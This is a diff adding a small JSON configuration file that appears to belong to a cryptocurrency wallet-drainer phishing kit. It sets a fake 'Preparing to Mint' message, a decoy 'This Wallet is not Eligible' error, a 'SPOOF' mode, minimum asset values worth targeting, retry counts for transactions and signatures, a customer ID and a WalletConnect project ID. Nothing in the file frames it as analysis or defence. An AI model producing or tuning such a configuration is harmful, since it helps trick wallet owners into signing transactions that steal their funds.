@@ -1,0 +1,16 @@
+{
+  "TRAFFIC": "Eleven my bestie!",
+  "SPOOF": "3",
+  "ASSET_MIN": "10",
+  "TOTAL_MIN": "10",
+  "MODAL_STYLE": "3",
+  "DARK_MODE": true,
+  "LOADING_MESSAGE": "Preparing to Mint",
+  "CONFIRM_MESSAGE": "Please confirm the transaction",
+  "ERROR_MESSAGE": "This Wallet is not Eligible",
+  "SIGNATURE": "0",
+  "TX_RETRY_COUNT": "7",
+  "SIG_RETRY_COUNT": "7",
+  "CUSTOMER_ID": "04B0-9C94-373F",
+  "REOWN_ID": "a2b178f91fd30e1f48f89b739549c7d8"
+}
